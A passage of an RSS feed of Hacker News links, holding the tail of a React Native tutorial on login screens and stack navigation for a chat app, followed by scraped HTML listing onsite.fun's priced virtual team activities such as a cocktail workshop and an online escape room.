        modeValue="text"
        uppercase={false}
        labelStyle={styles.navButtonText}
        onPress={() =&gt; navigation.navigate('Signup')}
      /&gt;
    &lt;/View&gt;
  );
}

const styles = StyleSheet.create({
  container: {
    backgroundColor: '#f5f5f5',
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  titleText: {
    fontSize: 24,
    marginBottom: 10,
  },
  loginButtonLabel: {
    fontSize: 22,
  },
  navButtonText: {
    fontSize: 16,
  },
});</code></pre>


<p>Later, you'll hook up this login screen to ChatKitty to log in users into your app. We've also configured 
the <code>navigation</code> prop to navigate the user to the Signup screen you'll soon be creating. For now, 
let's add a stack navigator to direct users to the initial login route.</p>
<p>Create a new directory <code>src/navigation/</code>. This will contain all the routes and components needed to build 
the app's navigation. Inside this directory, create a <code>AuthStack.js</code> file.</p>
<p>The <code>AuthStack.js</code> file should contain:</p>
<pre><code>import React from 'react';
import { createStackNavigator } from '@react-navigation/stack';
import LoginScreen from '../screens/LoginScreen';

const Stack = createStackNavigator();

export default function AuthStack() {
  return (
    &lt;Stack.Navigator initialRouteName="Login" headerMode="none"&gt;
      &lt;Stack.Screen name="Login" component={LoginScreen} /&gt;
    &lt;/Stack.Navigator&gt;
  );
}</code></pre>


<p>Later, you'll be adding another route for the Signup screen to our navigator.</p>
<p>Next, you'll need a navigation container to hold the app's stacks, starting with the auth stack. 
Create a <code>Routes.js</code> file inside the <code>src/navigation/</code> directory.</p>
<p>The <code>Routes.js</code> file should contain:</p>
<pre><code>import React from 'react';
import { NavigationContainer } from '@react-navigation/native';
import AuthStack from './AuthStack';

export default function Routes() {
  return (
    &lt;NavigationContainer&gt;
      &lt;AuthStack /&gt;
    &lt;/NavigationConta…</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.chatkitty.com/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/">https://www.chatkitty.com/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/</a></em></p>]]>
            </description>
            <link>https://www.chatkitty.com/blog/posts/building-a-chat-app-with-react-native-and-firebase-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197365</guid>
            <pubDate>Tue, 24 Nov 2020 11:05:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Virtual Experiences for Teams]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197289">thread link</a>) | @joalavedra
<br/>
November 24, 2020 | https://onsite.fun/activities | <a href="https://web.archive.org/web/*/https://onsite.fun/activities">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div mb="2"><div><div><p>Connecting teams through personalized and curated virtual activities.</p></div></div><div><div><ul><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f96c0c35e980c07219862d7"><div><div><div><div width="0"><p><img alt="4" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczA1LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczAxLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczAyLnBuZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczAzLkpQRyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczA0LnBuZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="4" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczA1LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJhcmNoZW9sb2d5X29mX2xlYXZlczAxLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div></div></div></div><div><p><h6>Archaeology of Leaves</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>Serbian</span></p><p><span> English</span></p><p><span> Spanish</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f96e639d43a3b033484d677"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ2aXJ0dWFsX3N0cmVldF9hcnRfYWR2ZW50dXJlMy5qcGciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ2aXJ0dWFsX3N0cmVldF9hcnRfYWR2ZW50dXJlMC5qcGciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ2aXJ0dWFsX3N0cmVldF9hcnRfYWR2ZW50dXJlMS5qcGciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ2aXJ0dWFsX3N0cmVldF9hcnRfYWR2ZW50dXJlMi5qcGciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ2aXJ0dWFsX3N0cmVldF9hcnRfYWR2ZW50dXJlMy5qcGciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ2aXJ0dWFsX3N0cmVldF9hcnRfYWR2ZW50dXJlMC5qcGciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div></div></div></div><div><p><h6>The Lisbon Street Art Adventure</h6></p><div><p>From 75€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>Portuguese</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f96eab3d43a3b033484d678"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJkaXNjb3Zlcl92aXN1YWxfdGhpbmtpbmcwNC5qcGVnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJkaXNjb3Zlcl92aXN1YWxfdGhpbmtpbmcwMS5qcGVnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJkaXNjb3Zlcl92aXN1YWxfdGhpbmtpbmcwMi5qcGVnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJkaXNjb3Zlcl92aXN1YWxfdGhpbmtpbmcwMy5qcGVnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJkaXNjb3Zlcl92aXN1YWxfdGhpbmtpbmcwNC5qcGVnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJkaXNjb3Zlcl92aXN1YWxfdGhpbmtpbmcwMS5qcGVnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div></div></div></div><div><p><h6>Discover Visual Thinking</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>Greek</span></p><p><span>English</span></p><p><span>Spanish</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f96f32bd43a3b033484d679"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJtYWdpY19zaG93MDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJtYWdpY19zaG93MDMuanBlZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJtYWdpY19zaG93MDQuanBlZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJtYWdpY19zaG93MDIuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJtYWdpY19zaG93MDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJtYWdpY19zaG93MDMuanBlZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div></div></div></div><div><p><h6>Magic Show with a Professional Magician</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>French</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f970a2ed43a3b033484d67a"><div><div><div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJjb2NrdGFpbF9tYXN0ZXJjbGFzczA0LmpwZWciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJjb2NrdGFpbF9tYXN0ZXJjbGFzczAxLmpwZWciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJjb2NrdGFpbF9tYXN0ZXJjbGFzczAyLmpwZWciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJjb2NrdGFpbF9tYXN0ZXJjbGFzczA0LmpwZWciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJjb2NrdGFpbF9tYXN0ZXJjbGFzczAxLmpwZWciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div></div></div></div><div><p><h6>Cocktail Workshop and Masterclass</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>Portuguese</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f970dc8d43a3b033484d67b"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ0aGVfc2VjcmV0c19zY2FuZGFsMDQuSlBHIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ0aGVfc2VjcmV0c19zY2FuZGFsMDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ0aGVfc2VjcmV0c19zY2FuZGFsMDIuSlBHIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ0aGVfc2VjcmV0c19zY2FuZGFsMDMuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ0aGVfc2VjcmV0c19zY2FuZGFsMDQuSlBHIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ0aGVfc2VjcmV0c19zY2FuZGFsMDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div></div></div></div><div><p><h6>The Secrets and Scandal of art at the Borghese</h6></p><div><p>From 75€</p><p> / 5 people</p></div><div><div><p><span>English</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f989d667c1a08065afb4615"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJlc3BhZHJpbGxhMDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJlc3BhZHJpbGxhMDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJlc3BhZHJpbGxhMDIuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJlc3BhZHJpbGxhMDMuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJlc3BhZHJpbGxhMDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJlc3BhZHJpbGxhMDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div></div></div></div><div><p><h6>Create Your Own Espadrilles Workshop</h6></p><div><p>From 350€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>Spanish</span></p><p><span>French</span></p></div></div></div><div><div><div><div><p><span>Material included</span></p></div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5f9e8c9d758ef0033ec1c532"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJvbmxpbmVfc2NhcGVfcm9vbTA0LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJvbmxpbmVfc2NhcGVfcm9vbTAxLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJvbmxpbmVfc2NhcGVfcm9vbTAyLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJvbmxpbmVfc2NhcGVfcm9vbTAzLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJvbmxpbmVfc2NhcGVfcm9vbTA0LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJvbmxpbmVfc2NhcGVfcm9vbTAxLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div></div></div></div><div><p><h6>Online Live Escape Room</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>English</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5fa47a42ccb5fb037cbcc1e6"><div><div><div><div width="0"><p><img alt="4" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczA1LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczAxLlBORyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczAyLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczAzLmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczA0LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="4" 